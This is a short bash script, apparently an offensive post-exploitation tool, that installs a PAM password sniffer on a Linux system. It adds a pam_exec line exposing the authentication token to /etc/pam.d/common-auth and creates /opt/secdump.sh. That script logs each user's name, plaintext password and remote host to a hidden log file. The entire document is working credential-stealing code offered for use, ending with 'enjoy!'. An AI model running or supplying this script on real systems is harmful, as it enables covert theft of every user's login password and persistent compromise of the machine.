#!/bin/bash
# This technique seems to have originated here:
# https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/
echo 'deployes a PAM.d sniffer'
echo
echo "inserting into PAM.d/common-auth"
echo "auth      optional        pam_exec.so     quiet   expose_authtok  /opt/secdump.sh" >> /etc/pam.d/common-auth
echo "done with that"
echo "creating script"
echo '#!/bin/sh' > /opt/secdump.sh
echo 'echo "$(date +%Y-%m-%d_%H:%M:%S) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log' >> /opt/secdump.sh
echo "done with that"
echo "making executable"
chmod +x /opt/secdump.sh
echo "done with that"
echo
echo "done done - enjoy!"
echo
#EOF
